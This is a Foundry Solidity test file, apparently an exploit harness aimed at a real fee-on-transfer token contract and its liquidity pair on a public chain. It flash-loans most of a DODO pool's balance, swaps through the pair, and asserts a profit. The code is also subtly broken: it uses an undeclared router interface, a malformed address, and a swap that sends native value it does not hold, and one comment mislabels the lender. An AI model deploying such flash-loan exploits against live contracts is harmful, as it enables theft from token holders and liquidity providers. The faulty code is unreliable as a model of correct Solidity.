// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IEthBurn {
    function uniswapV2Router() external returns (address);
    function uniswapV2Pair() external returns (address);
    function DEAD() external returns (address);
    function tradingEnabled() external returns (bool);
    function sellAmount() external returns (uint256);
    function buyAmount() external returns (uint256);
    function dividendTracker() external returns (address);
    function marketingWallet() external returns (address);
    function devWallet() external returns (address);
    function maxWallet() external returns (uint256);
    function swapTokensAtAmount() external returns (uint256);
    function sellRewardsFee() external returns (uint256);
    function sellDeadFees() external returns (uint256);
    function sellMarketingFees() external returns (uint256);
    function sellLiquidityFee() external returns (uint256);
    function buyDeadFees() external returns (uint256);
    function buyMarketingFees() external returns (uint256);
    function buyLiquidityFee() external returns (uint256);
    function buyRewardsFee() external returns (uint256);
    function buyDevFee() external returns (uint256);
    function sellDevFee() external returns (uint256);
    function transferFee() external returns (uint256);
    function swapAndLiquifyEnabled() external returns (bool);
    function gasForProcessing() external returns (uint256);
    function automatedMarketMakerPairs(address) external returns (bool);
    function stakingBonus(address) external returns (uint256);
    function stakingUntilDate(address) external returns (uint256);
    function stakingAmounts(uint256) external returns (uint256);
    function limitsInEffect() external returns (bool);
    function launchblock() external returns (uint256);
    function cooldowntimer() external returns (uint256);
    function enabledPublicTrading() external returns (bool);
    function whitelistForPublicTrade(address) external returns (bool);
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address) external;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function updateStakingAmounts(uint256,uint256) external;
    function setWhitelistForPublicTrade(address,bool) external;
    function setPublicTrading() external;
    function setTrueDefiRouter(address) external;
    function setPresaleWallet(address) external;
    function setExcludeFees(address,bool) external;
    function setExcludeDividends(address) external;
    function setIncludeDividends(address) external;
    function setCanTransferBefore(address,bool) external;
    function setLimitsInEffect(bool) external;
    function setGasPriceLimit(uint256) external;
    function setcooldowntimer(uint256) external;
    function setmaxWallet(uint256) external;
    function enableStaking(bool) external;
    function stake(uint256) external;
    function setSwapTriggerAmount(uint256) external;
    function enableSwapAndLiquify(bool) external;
    function setAutomatedMarketMakerPair(address,bool) external;
    function setAllowCustomTokens(bool) external;
    function setAllowAutoReinvest(bool) external;
    function updateGasForProcessing(uint256) external;
    function transferAdmin(address) external;
    function updateTransferFee(uint256) external;
    function updateFees(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256) external;
    function getStakingInfo(address) external view returns (uint256,uint256);
    function getTotalDividendsDistributed() external view returns (uint256);
    function isExcludedFromFees(address) external view returns (bool);
    function withdrawableDividendOf(address) external view returns (uint256);
    function dividendTokenBalanceOf(address) external view returns (uint256);
    function getAccountDividendsInfo(address) external view returns (address,int256,int256,uint256,uint256,uint256);
    function getAccountDividendsInfoAtIndex(uint256) external view returns (address,int256,int256,uint256,uint256,uint256);
    function processDividendTracker(uint256) external;
    function claim() external;
    function getLastProcessedIndex() external view returns (uint256);
    function getNumberOfDividendTokenHolders() external view returns (uint256);
    function setAutoClaim(bool) external;
    function setReinvest(bool) external;
    function setDividendsPaused(bool) external;
    function isExcludedFromAutoClaim(address) external view returns (bool);
    function isReinvest(address) external view returns (bool);
    function updatePayoutToken(address) external;
    function getPayoutToken() external view returns (address);
    function setMinimumTokenBalanceForAutoDividends(uint256) external;
    function setMinimumTokenBalanceForDividends(uint256) external;
    function forceSwapAndSendDividends(uint256) external;
    function airdropToWallets(address[] memory,uint256[] memory) external;
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // Fetch WETH router and pair details
    IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5A57B78B54704E256024E);
    IUniswapV2Pair pair = IUniswapV2Pair(0xE85372Bc82bF135344cDbB28810fe0B0931Fb358);

    // Start by swapping a part of the flash loan amount for the EthBurn token
    address[] memory path = new address[](2);
    path[0] = router.WETH();
    path[1] = address(0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4);

    // Approve the router to spend WETH
    IWETH(router.WETH()).approve(address(router), amount);
    
    // Swap WETH for EthBurn token
    router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, address(this), block.timestamp);

    // Fetch the balance of EthBurn token from this contract
    uint256 tokenBalance = IERC20(path[1]).balanceOf(address(this));
    
    // Approve the pair contract to spend EthBurn token
    IERC20(path[1]).approve(address(pair), tokenBalance);
    
    // Get reserves from the pair for the swap
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    
    // Calculate the amount to swap back into WETH
    uint256 amountOut = tokenBalance; // Adjust this amount based on available reserves in the pair

    // Swap EthBurn token back to WETH
    pair.swap(amountOut, 0, address(this), new bytes(0));
}
}


